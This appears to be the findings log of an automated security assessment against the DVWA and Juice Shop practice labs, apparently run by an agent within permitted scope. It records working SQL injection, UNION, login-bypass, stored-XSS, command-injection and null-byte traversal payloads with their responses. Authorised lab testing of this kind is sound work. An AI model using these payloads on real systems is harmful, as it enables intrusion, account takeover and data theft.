state.objective: Discover and behaviorally verify security vulnerabilities across permitted targets (http://dvwa and http://juiceshop:3000) within strict HTTP, LLM, and duration budgets.

endpoints.observation_evidence: [security=high] GET /vulnerabilities/sqli/ shows 'Security level set to high' and 'Click here to change your ID' link (to session-input.php); no inline form. Query consumes id previously POSTed to /vulnerabilities/sqli/session-input.php. Footer Security Level: high.
[security=high] GET /vulnerabilities/exec/ shows form action=/vulnerabilities/exec/ method=POST, fields ip and Submit; footer Security Level: high.
[security=high] GET /vulnerabilities/xss_s/ shows same form schema (txtName maxlength=10, mtxMessage maxlength=50, btnSign, btnClear); footer Security Level: high.

GET /security.php (dvwa_admin) shows form action=/security.php method=POST with select security, submit seclev_submit=Submit, and hidden user_token. POST with security=medium and high (valid user_token) returns 302 to /security.php; subsequent pages show 'Security level set to medium'/'high' in the body and footer. Note: http_request session_info.security_level stays 'low' even after changes; trust the page footer 'Security Level:' instead.

GET /rest/products/search?q=apple returned 200 JSON {status:success,data:[{id,name,description,price,deluxePrice,image,...}]}. Two products returned (Apple Juice, Apple Pomace). Unverified: SQLi candidate on q. Status: pending_verification.
POST JSON {email,password} with a non-existent probe account returned 401 'Invalid email or password.' Login schema confirmed (JSON body keys email and password). Status: pending_verification.

GET /api/Feedbacks unauthenticated returned 200 with 8 feedback records (UserId, id, comment, rating, createdAt, updatedAt). Comments include partially masked author emails (e.g. '(***in@juice-sh.op)'). Status: pending_verification for PII disclosure.

Directory listing at /ftp/ (200 text/html) lists acquisitions.md (909 bytes), legal.md, package.json.bak (4291), coupons_2013.md.bak, incident-support.kdbx, encrypt.pyc, eastere.gg, announcement_encrypted.md, suspicious_errors.yml, and quarantine/. Candidate for null-byte traversal on *.bak files. Status: pending_verification.
Linked from /ftp/ listing (909 bytes). Direct retrieval not yet performed in mapping phase. Status: candidate, pending_verification.
GET /encryptionkeys/ returned 200 with a browsable directory listing: jwt.pub (248 bytes), premium.key (50 bytes). Status: pending_verification.

acct1 own basket is id 6 (UserId 22; contains Apple Juice (1000ml) qty 3). acct2 own basket is id 7. Incidental observation: juiceshop_acct2 GET /rest/basket/1 returned basket 1 (UserId 1) with 3 products (Apple Juice qty 2, Orange Juice qty 3, Eggfruit Juice qty 1), and acct1 also got basket 1 with the same content. Object-level authorization on basket IDs is not enforced in the mapping data; full cross-user verification of basket 6 by acct2 is pending. Status: pending_verification.

[security=medium] GET /vulnerabilities/sqli/ shows form action=/vulnerabilities/sqli/ method=POST with fields id and Submit; page text 'Security level set to medium'. Form is POST at medium (low was GET ?id=).

[security=high] GET /vulnerabilities/sqli/session-input.php returns 'SQL Injection Session Input' page with form action=/vulnerabilities/sqli/session-input.php method=POST, fields id (text) and Submit. Value is stored in session and consumed by /vulnerabilities/sqli/ (load that page after submitting).

findings.title: DVWA SQL Injection (boolean-based) on /vulnerabilities/sqli/ id parameter [security=low]
findings.response_evidence: [security=low] TRUE payload id=1' OR '1'='1 returned 5 records: ID 1' OR '1'='1 First name: admin Surname: admin; First name: Gordon Surname: Brown; First name: Hack Surname: Me; First name: Pablo Surname: Picasso; First name: Bob Surname: Smith. FALSE payload id=1' AND '1'='2 returned 0 records (output 'User ID:' followed by no ID/First name/Surname rows). Multiple seeded surnames (admin, Brown, Me, Picasso, Smith) appear only under the TRUE condition. HTTP 200 for both; the record-count difference is the proof.

findings.title: [security=medium] OS Command Injection via pipe in ip parameter on /vulnerabilities/exec/
findings.response_evidence: [security=medium] Response body under 'Ping a device' contains output line 'www-data' following the ping section; footer 'Security Level: medium'. pre_blocks detected 'www-data'. Payload with pipe (no semicolon/&&) executed the injected whoami command.

findings.title: Juice Shop login authentication bypass via SQL injection in email field on POST /rest/user/login
findings.response_evidence: HTTP 200 application/json: {"authentication":{"token":"[REDACTED_JWT]","bid":1,"umail":"admin@juice-sh.op"}}. A valid authentication token was issued for the first user admin@juice-sh.op without valid credentials, so the injected email clause bypassed the password check. Token value redacted in this record.

findings.title: Stored XSS in DVWA Guestbook message field [security=low]
request_sequence: GET http://dvwa/vulnerabilities/xss_s/ (dvwa_admin) -> security_level=low confirmed in session_info and footer

Browser (dvwa_admin): fill txtName='vrfyxss', mtxMessage='<script id="test_token">window.xss_flag=1</script>' (50 chars, fits maxlength), click btnSign='Sign Guestbook' only (btnClear not used). Form has no user_token field at low.
findings.response_evidence: [security=low] Security Level: low confirmed. After submitting the canary, the re-rendered guestbook contains the stored entry 'Name: vrfyxss'. DOM check on reload: document.getElementById('test_token') is present (the <script id="test_token"> element was stored unescaped and rendered as a live script). Body HTML contains 'test_token'. Visible text strips the script element, so the entry appears as 'Message:' with no text.

findings.title: BOLA: juiceshop_acct2 reads acct1's basket 6 (Insecure Direct Object Reference on /rest/basket/:id)
request_sequence: GET http://juiceshop:3000/rest/basket/6 (juiceshop_acct2; session_info.own_basket_id=7, acct2 email acct2_bench@juiceshop.local)
findings.response_evidence: HTTP 200 application/json: {"status":"success","data":{"id":6,"coupon":null,"UserId":22,...,"Products":[{"id":1,"name":"Apple Juice (1000ml)",...,"BasketItem":{"ProductId":1,"BasketId":6,"id":9,"quantity":3,...}}]}}. Basket 6 belongs to UserId 22, which is acct1 (own_basket_id=6 per acct1 session). acct2 (own basket 7) retrieved acct1's seeded item Apple Juice (1000ml), quantity 3. Cross-user access confirmed.

findings.title: Confidential acquisitions memo exposed via open /ftp/ directory listing
findings.response_evidence: Listing at /ftp/ (HTTP 200, unauthenticated) shows 'acquisitions.md 909'. Direct GET /ftp/acquisitions.md returned HTTP 200, text/markdown: "# Planned Acquisitions / > This document is confidential! Do not distribute! / Our company plans to acquire several competitors within the next year. This will have a significant stock market impact..."

findings.title: Product-Search SQL Injection via q parameter (unauthenticated)
findings.response_evidence: Baseline q=apple: HTTP 200 application/json {"status":"success","data":[{"id":1,"name":"Apple Juice (1000ml)",...},{"id":24,"name":"Apple Pomace",...}]}. Probe q=qwert': HTTP 500 text/html "Error: SQLITE_ERROR: near \"'%'\": syntax error". UNION q=x')) UNION SELECT 1,2,3,4,5,6,7,8,9--: HTTP 200 {"status":"success","data":[{"id":1,"name":2,"description":3,"price":4,"deluxePrice":5,"image":6,"createdAt":7,"updatedAt":8,"deletedAt":9}]}. The injected integers are reflected in product fields, proving attacker-controlled SQL column output versus the benign baseline.

findings.title: Unauthenticated User-Feedback listing exposes author email fragments (PII)
findings.response_evidence: HTTP 200 without authentication, {"status":"success","data":[...8 records...]} with UserId, id, comment, rating, createdAt, updatedAt. Records are returned unauthenticated (access control gap confirmed), but author emails appear only partially masked inside comment text: "(***in@juice-sh.op)", "(***@juice-sh.op)", "(***der@juice-sh.op)", "(***ereum@juice-sh.op)". Anonymous records show "(anonymous)". No full email address is disclosed in any record, and no separate email field exists. Full PII disclosure criterion is NOT met as written; partial email fragments/domain leak only. Recommend Coordinator treat as lower-severity unauthenticated data exposure or re-test if full emails are expected.

findings.title: Browsable Encryption-Keys Directory Listing exposes premium.key and jwt.pub (unauthenticated)
findings.response_evidence: HTTP 200 text/html, body: "listing directory /encryptionkeys/ ~ / encryptionkeys / Name Size Modified jwt.pub 248 12/19/2023 1:12:12 PM premium.key 50 12/19/2023 1:12:12 PM". Links to /encryptionkeys/jwt.pub and /encryptionkeys/premium.key are present. Directory is browsable without authentication and exposes both sensitive key files.

findings.title: Poison null-byte path traversal bypasses /ftp/ .bak extension filter
findings.response_evidence: Raw path: HTTP 403 "Error: Only .md and .pdf files are allowed!" (fileServer.js verify). Null-byte path: HTTP 200, content_type application/octet-stream, body begins {"name": "juice-shop", "version": "6.2.0-SNAPSHOT", "description": "An intentionally insecure JavaScript Web Application", ... "dependencies": {...}}. The restricted backup file was returned.

findings.title: Open directory listing at /ftp/ exposes confidential files (CWE-200 leg not yet proven)
findings.response_evidence: HTTP 200 text/html directory listing, browsable without auth. Lists acquisitions.md (909), legal.md (3047), package.json.bak (4291), coupons_2013.md.bak (131), incident-support.kdbx (3246), encrypt.pyc, eastere.gg, announcement_encrypted.md, suspicious_errors.yml, quarantine/. Listing is confirmed, but acquisitions.md was not retrieved in this assignment, so the confidential-memo content leg of CWE-200 is not yet verified.

findings.title: [security=medium] SQL Injection (numeric boolean) in POST id on /vulnerabilities/sqli/
findings.response_evidence: [security=medium] TRUE 'id=1 OR 1=1' returned 5 records with surnames: admin, Brown, Me, Picasso, Smith (First names admin, Gordon, Hack, Pablo, Bob). FALSE 'id=1 AND 1=2' returned zero records (only 'User ID: 1 2 3 4 5' header, no 'First name/Surname' rows). Footer: 'Security Level: medium', 'Security level set to medium'. Note: session_info metadata field reported 'low' but page footer confirms medium.

findings.title: [security=high] SQL Injection via session-input.php stored id consumed by /vulnerabilities/sqli/
findings.response_evidence: [security=high] After storing TRUE payload, GET /vulnerabilities/sqli/ returned 5 records: 'ID: 1' OR '1'='1' # First name: admin Surname: admin', 'Gordon Brown', 'Hack Me', 'Pablo Picasso', 'Bob Smith'. After storing FALSE payload 1' AND '1'='2' #, GET /vulnerabilities/sqli/ returned zero records (no First name/Surname rows). Footer shows 'Security Level: high' and 'Security level set to high'.

Budgets remain ample but further work would largely duplicate confirmed results.
